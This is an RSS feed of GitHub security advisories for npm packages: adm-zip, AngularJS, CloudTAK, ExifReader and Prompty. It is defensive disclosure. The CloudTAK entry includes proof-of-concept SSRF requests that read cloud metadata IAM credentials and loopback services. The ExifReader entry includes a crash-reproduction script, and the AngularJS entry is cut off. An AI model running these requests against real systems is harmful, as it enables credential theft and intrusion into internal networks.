<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-07-19T15:44:20.682Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[adm-zip] adm-zip: Crafted ZIP file triggers 4GB memory allocation]]></title>
        <id>https://github.com/advisories/GHSA-xcpc-8h2w-3j85</id>
        <link href="https://github.com/advisories/GHSA-xcpc-8h2w-3j85"/>
        <updated>2026-07-17T21:50:10.000Z</updated>
        <content type="html"><![CDATA[<p>adm-zip before 0.5.18 is vulnerable to denial of service via a crafted ZIP file with a manipulated uncompressed size header field. In zipEntry.js line 103, Buffer.alloc(_centralHeader.size) allocates memory based on the declared uncompressed size from the ZIP central directory header without validating it against the actual compressed data size or imposing any upper bound. The size value is read directly from the binary header at entryHeader.js line 266 with no bounds check. An attacker can craft a ~120-byte ZIP file that declares ~4GB uncompressed size, causing a memory allocation amplification ratio of over 33 million to 1. The allocation occurs before CRC validation, so the malicious payload cannot be rejected early. All extraction and read methods are affected: readFile(), readAsText(), extractEntryTo(), extractAllTo(), extractAllToAsync(), test(), and entry.getData(). Any application accepting untrusted ZIP files via adm-zip is vulnerable to immediate process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39244">https://nvd.nist.gov/vuln/detail/CVE-2026-39244</a></li>
<li><a href="https://github.com/cthackers/adm-zip/issues/568">https://github.com/cthackers/adm-zip/issues/568</a></li>
<li><a href="https://github.com/cthackers/adm-zip/commit/2450dcf417aa29df49270237d18c5245794da3e2">https://github.com/cthackers/adm-zip/commit/2450dcf417aa29df49270237d18c5245794da3e2</a></li>
<li><a href="https://github.com/cthackers/adm-zip/releases">https://github.com/cthackers/adm-zip/releases</a></li>
<li><a href="https://github.com/advisories/GHSA-xcpc-8h2w-3j85">https://github.com/advisories/GHSA-xcpc-8h2w-3j85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcpc-8h2w-3j85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-10T18:32:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[angular] Angular's deprecated package has a Cross-Site Scripting issue]]></title>
        <id>https://github.com/advisories/GHSA-7x27-g8rg-x87w</id>
        <link href="https://github.com/advisories/GHSA-7x27-g8rg-x87w"/>
        <updated>2026-07-17T21:47:02.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw in AngularJS' Strict Contextual Escaping (SCE) logic allows bypassing certain SCE policies for resource URLs and can lead to arbitrary JavaScript execution within the context of the victim's browser session.</p>
<p>SCE's purpose is to ensure that only trusted or safe values are used in certain security-sensitive contexts, such as resource URLs, including URLs that define executable JavaScript scripts, '</p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x27-g8rg-x87w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-24T21:30:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tak-ps/cloudtak] CloudTAK: Authenticated full-read SSRF in the /api/esri* routes — user-controlled URL fetched with no IP-classification guard]]></title>
        <id>https://github.com/advisories/GHSA-r95q-fp26-h3hc</id>
        <link href="https://github.com/advisories/GHSA-r95q-fp26-h3hc"/>
        <updated>2026-07-17T21:35:13.000Z</updated>
        <content type="html"><![CDATA[<h1 id="authenticated-full-read-ssrf-in-cloudtak-apiesri-routes--user-controlled-url-fetched-with-no-ip-classification-guard">Authenticated full-read SSRF in CloudTAK <code>/api/esri*</code> routes — user-controlled URL fetched with no IP-classification guard</h1>
<h2 id="summary">Summary</h2>
<p>Every route in the ESRI helper family (<code>api/routes/esri.ts</code>) takes a fully attacker-controlled URL from the request (<code>POST /api/esri</code> body <code>url</code>, and the <code>portal</code> / <code>server</code> / <code>layer</code> query parameters on the <code>GET /api/esri/*</code> routes) and passes it into <code>EsriBase</code> / <code>EsriProxyPortal</code> / <code>EsriProxyServer</code> / <code>EsriProxyLayer</code> in <code>api/lib/esri.ts</code>, which fetch it with the bare <code>fetch</code> from <code>@tak-ps/etl</code>. No IP / DNS / hostname classification is applied at any point, so the destination is never validated against private, loopback, or link-local ranges.</p>
<p>Any authenticated user (the routes only require <code>Auth.is_auth(config, req, { anyResources: true })</code>, i.e. any token, not an admin) can therefore make the CloudTAK server issue arbitrary outbound GET/POST requests to internal addresses such as the cloud instance-metadata service (<code>169.254.169.254</code>), loopback admin ports (<code>127.0.0.1:&lt;port&gt;</code>), and other hosts reachable only from inside the deployment VPC.</p>
<p>This is a <strong>full-read</strong> SSRF, not blind: on success the upstream JSON body is returned to the caller via <code>res.json(...)</code>, and on failure the upstream error string is reflected verbatim as <code>ESRI Server Error: &lt;message&gt;</code>. An attacker can read cloud metadata (and the temporary IAM credentials the instance role exposes), enumerate internal services, and exfiltrate their response bodies.</p>
<p>The <code>sniff()</code> URL classifier provides no protection: it only pattern-matches the <em>pathname</em> (<code>/rest</code>, <code>/arcgis/rest</code>, <code>/sharing/rest</code>), so a URL like <code>http://169.254.169.254/arcgis/rest</code> or <code>http://127.0.0.1:8500/rest</code> passes <code>sniff()</code> and is fetched.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>All versions up to and including <strong>13.7.0</strong> (latest at time of report).</li>
</ul>
<p>The project already ships an SSRF guard helper — <code>isSafeUrl</code> from <code>@tak-ps/node-safeurl</code> — and wires it into the basemap, task, and video-service code paths, but the entire <code>/api/esri*</code> route family and the ESRI fetch library (<code>api/lib/esri.ts</code>) were never wired up, leaving the guard absent on this surface.</p>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p>All permalinks are pinned to commit <code>c7433679d2107fa0258e9005069bc5b4ca5773aa</code> (release lineage of 13.7.0).</p>
<p><strong>Routes — user input → ESRI fetch, no guard</strong> (<code>api/routes/esri.ts</code>):</p>
<ul>
<li><code>POST /api/esri</code> — body <code>url</code> → <code>new URL(req.body.url)</code> → <code>EsriBase.from(url)</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L32-L64">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L32-L64</a></li>
<li><code>GET /api/esri/portal</code> — query <code>portal</code> → <code>new EsriBase(req.query.portal)</code> → <code>EsriProxyPortal.getPortal()</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L79-L98">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L79-L98</a></li>
<li><code>GET /api/esri/portal/content</code> — query <code>portal</code> → <code>EsriProxyPortal.getContent()</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L115-L139">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L115-L139</a></li>
<li><code>GET /api/esri/portal/server</code> — query <code>portal</code> → <code>EsriProxyPortal.getServers()</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L191-L212">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L191-L212</a></li>
<li><code>GET /api/esri/server</code> — query <code>server</code> → <code>EsriProxyServer.getList()</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L225-L249">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L225-L249</a></li>
<li><code>GET /api/esri/server/layer</code> — query <code>layer</code> → <code>EsriProxyLayer.sample()</code>:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L333-L356">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L333-L356</a></li>
</ul>
<p><strong>Library — the <code>fetch</code> sinks</strong> (<code>api/lib/esri.ts</code>), all reached with the user URL and none preceded by a guard:</p>
<ul>
<li><code>import { fetch } from '@tak-ps/etl';</code>
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L6">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L6</a></li>
<li><code>EsriBase.fetchVersion()</code> — <code>const res = await fetch(url);</code>
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L162-L187">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L162-L187</a></li>
<li><code>EsriBase.generateToken()</code> — <code>fetch(url, { method: 'POST', ... })</code>
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L107">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L107</a></li>
<li><code>EsriProxyPortal.getContent</code> / <code>getPortal</code> / <code>getSelf</code> / <code>getServers</code> / <code>createService</code> — <code>fetch</code> at lines 283, 301, 330, 347, 371</li>
<li><code>EsriProxyServer.deleteLayer</code> / <code>createLayer</code> / <code>getList</code> — <code>fetch</code> at lines 407, 433, 455</li>
<li><code>EsriProxyLayer.tilejson</code> / <code>#sampleFeatures</code> — <code>fetch</code> at lines 503, 552</li>
</ul>
<p><strong><code>sniff()</code> only inspects the pathname</strong> (no host/IP check):
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L142-L156">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L142-L156</a></p>
<p><strong>The guard exists elsewhere but is missing here</strong> — for comparison, the basemap import path classifies the URL before fetching:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L85-L90">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L85-L90</a></p>
<p>Note also that the ESRI sub-branch inside <code>basemap.ts</code> (<code>isEsriLayerURL(...)</code> → <code>new EsriBase(...)</code> → <code>EsriProxyLayer.tilejson()</code>) reaches the same unguarded ESRI library and is therefore equally affected:
<a href="https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L770-L773">https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L770-L773</a></p>
<p><code>grep -c isSafeUrl api/routes/esri.ts api/lib/esri.ts</code> returns <code>0</code> and <code>0</code>.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Prerequisites: a running CloudTAK instance and a valid user token (any non-admin user account — the routes only call <code>Auth.is_auth(config, req, { anyResources: true })</code>).</p>
<h3 id="1-read-cloud-instance-metadata-credential-theft">1. Read cloud instance metadata (credential theft)</h3>
<pre><code class="language-http">POST /api/esri HTTP/1.1
Host: cloudtak.example.org
Authorization: Bearer &lt;any-valid-user-token&gt;
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/arcgis/rest" }
</code></pre>
<p>The server's <code>EsriBase.from()</code> calls <code>fetchVersion()</code> → <code>fetch('http://169.254.169.254/...?f=json')</code>. The path contains <code>/rest</code>, so <code>sniff()</code> classifies it as <code>SERVER</code> and the request proceeds. The metadata service's response body is read back to the attacker — either inside the successful JSON response, or reflected in the error string (<code>ESRI Server Error: &lt;upstream body fragment&gt;</code>). On AWS IMDSv1 deployments this yields the instance-role temporary credentials.</p>
<h3 id="2-read-an-internal-only-service-over-loopback--vpc-full-read">2. Read an internal-only service over loopback / VPC (full-read)</h3>
<pre><code class="language-http">GET /api/esri/server?server=http://127.0.0.1:8500/rest HTTP/1.1
Host: cloudtak.example.org
Authorization: Bearer &lt;any-valid-user-token&gt;
</code></pre>
<p><code>new EsriBase('http://127.0.0.1:8500/rest')</code> → <code>EsriProxyServer.getList()</code> → <code>fetch('http://127.0.0.1:8500/rest?f=json')</code>. The full JSON returned by the internal service (here a Consul/admin port, but any internal host:port reachable from the CloudTAK box works) is reflected to the attacker via <code>res.json(list)</code>.</p>
<p><code>GET /api/esri/portal?portal=http://&lt;internal-host&gt;/sharing/rest</code> and <code>GET /api/esri/server/layer?layer=http://&lt;internal-host&gt;/rest/.../FeatureServer/0&amp;query=1=1</code> give the same full-read primitive on the other sub-routes.</p>
<h3 id="3-negative-control--unauthenticated-is-rejected">3. Negative control — unauthenticated is rejected</h3>
<pre><code class="language-http">POST /api/esri HTTP/1.1
Host: cloudtak.example.org
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/arcgis/rest" }
</code></pre>
<p>Returns <code>403 Authentication Required</code> (from <code>Auth.is_auth</code> → <code>api/lib/auth.ts:118</code>). The SSRF is reachable by any authenticated user but not by an anonymous one.</p>
<h3 id="e2e-reproduction-sink-path-against-a-controlled-internal-victim">E2E reproduction (sink path against a controlled internal victim)</h3>
<p>Because exercising the real route against a public cloud metadata endpoint is not something to do against third-party infrastructure, the sink was reproduced against a local internal-only victim using the <strong>same <code>fetch</code> import (<code>@tak-ps/etl</code>) and the verbatim <code>EsriBase.sniff()</code> + <code>fetchVersion()</code> logic</strong> the route uses. The harness models the route handler exactly: it <code>new URL()</code>s the user input, runs <code>sniff()</code>, then <code>fetch()</code>s — with <code>isSafeUrl</code> deliberately <em>not</em> called (matching shipped behavior), and a toggled control branch that calls it (matching the basemap guard).</p>
<p>Victim (<code>victim.mjs</code>) — an internal-only service on <code>127.0.0.1:9099</code> returning a secret JSON body:</p>
<pre><code>[victim] internal service listening on 127.0.0.1:9099
[victim] HIT GET /arcgis/rest?f=json from 127.0.0.1
</code></pre>
<p>Harness output (<code>esri_ssrf_e2e.mjs</code>), user-supplied URL <code>http://127.0.0.1:9099/arcgis/rest</code>:</p>
<pre><code>[VULN/no-guard] route returned full internal body:
{
  "type": "SERVER",
  "base": "http://127.0.0.1:9099/arcgis/rest",
  "upstreamBody": {
    "currentVersion": "11.4",
    "internal-only": true,
    "aws-metadata-simulated": {
      "iam": { "role": "cloudtak-prod-instance-role", "AccessKeyId": "ASIA_FAKE_INTERNAL_KEY_DO_NOT_USE" }
    },
    "note": "If you can read this from a user-supplied URL, that is SSRF (full-read)."
  }
}
[CONTROL/guarded] blocked as expected: Blocked URL: blocked IP address: 127.0.0.1
</code></pre>
<p>And <code>isSafeUrl</code> confirms it <em>would</em> block the metadata / loopback targets if it were called on this path:</p>
<pre><code>http://169.254.169.254/latest/meta-data/ =&gt; {"safe":false, ... "reason":"blocked IP address: 169.254.169.254"}
http://127.0.0.1:9999/                  =&gt; {"safe":false, ... "reason":"blocked IP address: 127.0.0.1"}
http://localhost/                       =&gt; {"safe":false, ... "reason":"blocked hostname: localhost"}
</code></pre>
<p>So: with the shipped (no-guard) code the request reaches the internal victim and the full internal body is returned; with the basemap-style <code>isSafeUrl</code> guard the same request is blocked. (A full container OOM-style demonstration of reading real cloud metadata is intentionally not performed against live infrastructure; the victim-host reproduction is the honest, self-contained equivalent of the route's fetch path.)</p>
<h2 id="root-cause">Root cause</h2>
<p>Two compounding gaps:</p>
<ol>
<li><p><strong>No IP/DNS classification before fetch.</strong> <code>api/lib/esri.ts</code> imports the unguarded <code>fetch</code> from <code>@tak-ps/etl</code> and calls it with a URL derived directly from user input in every <code>EsriProxy*</code> method and in <code>EsriBase.fetchVersion()</code> / <code>generateToken()</code>. Nothing resolves the hostname and rejects private / loopback / link-local addresses. The repository already depends on <code>@tak-ps/node-safeurl</code> (<code>isSafeUrl</code>) precisely for this, and uses it in <code>api/routes/basemap.ts</code>, <code>api/routes/task.ts</code>, and <code>api/lib/control/video-service.ts</code> — but the guard was never added to the ESRI route family or to the ESRI library. This is an <strong>incomplete migration</strong>: the SafeURL hardening (PR #1468) covered basemap/task/video but left <code>/api/esri*</code> and <code>api/lib/esri.ts</code> (including the ESRI sub-branch of basemap import) unprotected.</p>
</li>
<li><p><strong><code>sniff()</code> validates the wrong thing.</strong> The only inspection the URL receives before being fetched is <code>EsriBase.sniff()</code>, which pattern-matches the <em>pathname</em> for <code>/rest</code>, <code>/arcgis/rest</code>, or <code>/sharing/rest</code>. It never looks at the host, so an attacker simply appends <code>/rest</code> (or <code>/arcgis/rest</code>) to an internal URL and it is accepted and fetched.</p>
</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>CWE-918 Server-Side Request Forgery</strong>, full-read.</li>
<li><strong>Cloud credential theft:</strong> reading <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/...</code> (IMDSv1) yields the instance role's temporary AWS credentials, which an attacker can use against the deployment's cloud account.</li>
<li><strong>Internal network enumeration and data exfiltration:</strong> any host:port reachable from the CloudTAK server (loopback admin ports, VPC-internal services, databases with HTTP interfaces, link-local) can be probed and, where the response is JSON-ish, read in full via the reflected response body / error string.</li>
<li><strong>Privilege required:</strong> any authenticated user with any token (<code>anyResources: true</code>) — not limited to administrators. Unauthenticated requests are rejected (403), so this requires a valid account but no special role.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Centralize the existing <code>isSafeUrl</code> guard inside the ESRI library so every <code>/api/esri*</code> route and the ESRI sub-branch of basemap import are covered by one chokepoint, mirroring the guard already used in <code>basemap.ts</code>:</p>
<ul>
<li>Add an async URL-classification step that runs <code>isSafeUrl(...)</code> and throws <code>Blocked URL: &lt;reason&gt;</code> for any URL that resolves to a private/loopback/link-local address, before the first <code>fetch</code> in <code>EsriBase</code> (e.g. in <code>EsriBase.from()</code> and a guarded constructor/init path, so both <code>new EsriBase(...)</code> + later proxy calls and <code>EsriBase.from(...)</code> are covered).</li>
<li>Preserve the existing <code>process.env.StackName !== 'test'</code> test-mode skip used elsewhere so the test suite is unaffected.</li>
</ul>
<p>Because all six routes funnel through <code>EsriBase</code> / the <code>EsriProxy*</code> classes in <code>api/lib/esri.ts</code>, guarding the library is sufficient and avoids re-introducing the same per-route omission. A reference patch implementing exactly this (guard added to the ESRI library + applied on the route entry points, matching the basemap pattern) is provided as a pull request from a private fork.</p>
<h2 id="disclosure">Disclosure</h2>
<ul>
<li>Reported by <strong>tonghuaroot</strong>.</li>
<li>Credit: tonghuaroot only.</li>
</ul>
<hr>
<p><strong>Reference fix PR (private advisory fork):</strong> <a href="https://github.com/dfpc-coe/CloudTAK-ghsa-r95q-fp26-h3hc/pull/1">https://github.com/dfpc-coe/CloudTAK-ghsa-r95q-fp26-h3hc/pull/1</a> — commit <code>ff6dd1d9</code>, centralizing <code>isSafeUrl</code> inside <code>api/lib/esri.ts</code> (<code>safeFetch</code> wrapper + <code>EsriBase.assertSafe</code>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-r95q-fp26-h3hc">https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-r95q-fp26-h3hc</a></li>
<li><a href="https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.10.0">https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r95q-fp26-h3hc">https://github.com/advisories/GHSA-r95q-fp26-h3hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r95q-fp26-h3hc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-17T21:35:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[exifreader] ExifReader HEIC/AVIF ISO-BMFF parser throws uncaught RangeError on truncated boxes]]></title>
        <id>https://github.com/advisories/GHSA-g77h-45rf-hcx4</id>
        <link href="https://github.com/advisories/GHSA-g77h-45rf-hcx4"/>
        <updated>2026-07-17T20:19:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ExifReader 4.40.0 can throw an uncaught <code>RangeError: Offset is outside the bounds of the DataView</code> while parsing crafted HEIC/AVIF files. The file only needs a valid leading <code>ftyp</code> box with a HEIC/AVIF major brand followed by a malformed ISO-BMFF box, such as an empty 8-byte <code>free</code> box or a truncated extended-size box.</p>
<p>This is reachable through the public <code>ExifReader.load()</code> API for in-memory buffers and through the async file/URL loaders when an application parses attacker-supplied images. In applications that do not wrap every parse in a defensive try/catch, a single uploaded or fetched image can abort the request/worker and cause a denial of service.</p>
<p>Credit requested: Yaohui Wang.</p>
<h2 id="affected-version-tested">Affected version tested</h2>
<ul>
<li>npm package: <code>exifreader</code></li>
<li>Version: <code>4.40.0</code></li>
<li>Repository commit tested: <code>8cb0261a26b7d986955fe0a6780f076dcb7902e7</code></li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>The ISO-BMFF parser assumes that every top-level box with at least an 8-byte header also has enough bytes for the fields required by its parsed form. In <code>src/image-header-iso-bmff.js</code>:</p>
<ul>
<li><code>findMetaBox()</code> calls <code>parseBox(dataView, offset)</code> while only checking that <code>offset + 8 &lt;= dataView.byteLength</code>.</li>
<li><code>parseBox()</code> calls <code>getBoxLength()</code> and then unconditionally reads fields such as the full-box version byte for <code>meta</code>/<code>iloc</code>/<code>iinf</code>/<code>idat</code> boxes.</li>
<li><code>getBoxLength()</code> handles <code>boxLength === 1</code> by calling <code>hasEmptyHighBits(dataView, offset)</code>, which reads <code>dataView.getUint32(offset + 8)</code> without first checking that the 64-bit extended size field is present.</li>
</ul>
<p>As a result, syntactically small or truncated boxes after a valid HEIC/AVIF <code>ftyp</code> box escape the format-detection catch blocks and throw from the main parsing path.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Run this from the repository root against the committed <code>dist/exif-reader.js</code> bundle:</p>
<pre><code class="language-js">const ExifReader = require('./dist/exif-reader.js');

function u32be(n) {
  return [(n &gt;&gt;&gt; 24) &amp; 255, (n &gt;&gt;&gt; 16) &amp; 255, (n &gt;&gt;&gt; 8) &amp; 255, n &amp; 255];
}
function ascii(s) {
  return Array.from(Buffer.from(s, 'ascii'));
}
function box(type, content = []) {
  return [...u32be(8 + content.length), ...ascii(type), ...content];
}

for (const brand of ['heic', 'avif']) {
  for (const badBox of ['free', 'abcd']) {
    const bytes = Uint8Array.from([
      ...box('ftyp', ascii(brand)),
      ...box(badBox), // 8-byte box header with no content
    ]);

    try {
      ExifReader.load(bytes.buffer);
      console.log(`${brand}/${badBox}: no throw`);
    } catch (e) {
      console.log(`${brand}/${badBox}: ${e.name}: ${e.message}`);
      console.log(String(e.stack).split('\n').slice(0, 6).join('\n'));
    }
  }
}
</code></pre>
<p>Observed output on Node v23.11.0 with ExifReader 4.40.0:</p>
<pre><code class="language-text">heic/free: RangeError: Offset is outside the bounds of the DataView
RangeError: Offset is outside the bounds of the DataView
    at DataView.prototype.getUint8 (&lt;anonymous&gt;)
    at parseBox (.../dist/exif-reader.js:1:16513)
    at findMetaBox (.../dist/exif-reader.js:1:19032)
    at findOffsets (.../dist/exif-reader.js:1:19101)

heic/abcd: RangeError: Offset is outside the bounds of the DataView
avif/free: RangeError: Offset is outside the bounds of the DataView
avif/abcd: RangeError: Offset is outside the bounds of the DataView
</code></pre>
<p>A second variant triggers the extended-size path:</p>
<pre><code class="language-js">const truncatedExtendedBox = [...u32be(1), ...ascii('free')];
const heic = Uint8Array.from([...box('ftyp', ascii('heic')), ...truncatedExtendedBox]);
ExifReader.load(heic.buffer);
</code></pre>
<p>That throws from <code>hasEmptyHighBits()</code> / <code>getBoxLength()</code> because the extended-size high/low fields are not present.</p>
<h2 id="expected-behavior">Expected behavior</h2>
<p>Malformed/truncated metadata boxes should be handled like other malformed metadata in the project: return only the successfully parsed file type/metadata, return no app markers, or throw a controlled project-specific error. A safe JavaScript bounds error should not escape from the parser for an attacker-controlled image container.</p>
<h2 id="security-impact">Security impact</h2>
<p>This is a denial-of-service issue for services that parse user-provided HEIC/AVIF files with ExifReader. A minimal attacker-controlled image buffer can cause an unhandled exception in the parser and abort the surrounding request/worker if the embedding application does not catch every parse error.</p>
<p>Suggested severity: Medium. Suggested CVSS: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code>.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Add explicit bounds checks before every <code>DataView</code> read in the ISO-BMFF box parser, especially:</p>
<ul>
<li>before reading the 64-bit extended size fields in <code>getBoxLength()</code>;</li>
<li>before reading the full-box version byte in <code>parseBox()</code>;</li>
<li>before descending into <code>parseSubBoxes()</code> when a declared box length exceeds available bytes;</li>
<li>ensure <code>findMetaBox()</code> breaks on boxes whose declared length is invalid or not fully present.</li>
</ul>
<p>A regression test should cover <code>ftyp/heic</code> and <code>ftyp/avif</code> followed by an 8-byte empty <code>free</code>/unknown box and by a truncated extended-size box.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mattiasw/ExifReader/security/advisories/GHSA-g77h-45rf-hcx4">https://github.com/mattiasw/ExifReader/security/advisories/GHSA-g77h-45rf-hcx4</a></li>
<li><a href="https://github.com/mattiasw/ExifReader/releases/tag/v4.40.1">https://github.com/mattiasw/ExifReader/releases/tag/v4.40.1</a></li>
<li><a href="https://github.com/advisories/GHSA-g77h-45rf-hcx4">https://github.com/advisories/GHSA-g77h-45rf-hcx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g77h-45rf-hcx4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-17T20:19:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@prompty/core] Prompty: Arbitrary code execution via JavaScript frontmatter in TypeScript loader]]></title>
        <id>https://github.com/advisories/GHSA-c4gh-rv8h-q9vw</id>
        <link href="https://github.com/advisories/GHSA-c4gh-rv8h-q9vw"/>
        <updated>2026-07-17T19:53:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The TypeScript Prompty loader used <code>gray-matter</code> without overriding executable frontmatter engines. <code>gray-matter</code> supports JavaScript frontmatter blocks such as <code>---js</code> and evaluates them while parsing. An attacker-controlled <code>.prompty</code> file could therefore execute arbitrary JavaScript during prompt loading.</p>
<h2 id="affected-package">Affected package</h2>
<ul>
<li>npm <code>@prompty/core</code> v2 prerelease line: <code>&gt;= 2.0.0-alpha.1 &lt; 2.0.0-beta.3</code></li>
<li>Fixed in <code>@prompty/core@2.0.0-beta.3</code></li>
</ul>
<p>The legacy v1 JavaScript runtime had a historical hardening change for this issue. During the v2 TypeScript runtime rebuild, the loader again called <code>gray-matter</code> directly and the vulnerable behavior was present in the v2 prerelease packages until <code>2.0.0-beta.3</code>.</p>
<h2 id="impact">Impact</h2>
<p>Applications that load untrusted <code>.prompty</code> files, user-provided prompt paths, or prompt bundles from less-trusted locations could execute arbitrary JavaScript in the host Node.js process during frontmatter parsing.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>@prompty/core</code> to <code>2.0.0-beta.3</code> or later.</p>
<p>The fix explicitly overrides the <code>js</code> and <code>javascript</code> gray-matter engines and rejects JavaScript frontmatter in <code>.prompty</code> files. Prompty frontmatter is YAML-only; executable frontmatter is unsupported. A regression test now verifies that <code>---js</code> frontmatter is rejected and not evaluated.</p>
<h2 id="fix-details">Fix details</h2>
<p>Fixed by commit <code>c27402da2487075be577f06aa79df627fb9d6853</code> and released via <code>typescript/2.0.0-beta.3</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/prompty/security/advisories/GHSA-c4gh-rv8h-q9vw">https://github.com/microsoft/prompty/security/advisories/GHSA-c4gh-rv8h-q9vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53597">https://nvd.nist.gov/vuln/detail/CVE-2026-53597</a></li>
<li><a href="https://github.com/microsoft/prompty/commit/c27402da2487075be577f06aa79df627fb9d6853">https://github.com/microsoft/prompty/commit/c27402da2487075be577f06aa79df627fb9d6853</a></li>
<li><a href="https://github.com/advisories/GHSA-c4gh-rv8h-q9vw">https://github.com/advisories/GHSA-c4gh-rv8h-q9vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c4gh-rv8h-q9vw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-17T19:53:34.000Z</published>
    </entry>
    <entry>
